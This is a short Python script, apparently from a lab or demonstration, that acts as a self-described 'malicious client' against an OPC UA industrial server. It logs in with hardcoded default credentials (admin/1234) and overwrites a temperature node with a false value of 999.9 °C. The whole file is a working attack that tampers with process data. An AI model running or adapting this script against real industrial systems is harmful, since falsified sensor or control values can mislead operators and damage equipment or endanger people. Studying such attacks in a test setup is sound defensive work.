from opcua import Client
import time

client = Client("opc.tcp://localhost:4840/freeopcua/server/")
client.set_user("admin")
client.set_password("1234")

try:
    client.connect()
    print("Malicious client authenticated")

    # Read vulnerable node
    rogue_node = client.get_node("ns=2;s=Device1.RogueTemp")

    # Write new malicious value
    rogue_node.set_value(999.9)
    print("Vulnerable node writed with malicious value: 999.9 °C")

except KeyboardInterrupt:
    print("Attack stopped by user.")

finally:
    client.disconnect()
